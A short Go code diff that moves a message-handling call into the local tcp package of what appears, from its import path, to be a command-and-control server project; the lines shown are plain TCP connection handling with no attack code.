@@ -3,8 +3,6 @@ package tcp
 import (
 	"fmt"
 	"net"
-
-	"github.com/f1rehaz4rd/SpiritWorld/c2/pkg/api"
 )
 
 // SERVADDR is the server port number
@@ -19,7 +17,7 @@ func handleConnection(conn net.Conn) {
 	msg := make([]byte, 4096)
 	n, _ := conn.Read(msg)
 
-	if !api.HandleMessage(msg[:n], conn) {
+	if !HandleMessage(msg[:n], conn) {
 		fmt.Println("Error with connection: " + conn.RemoteAddr().String())
 	}
 
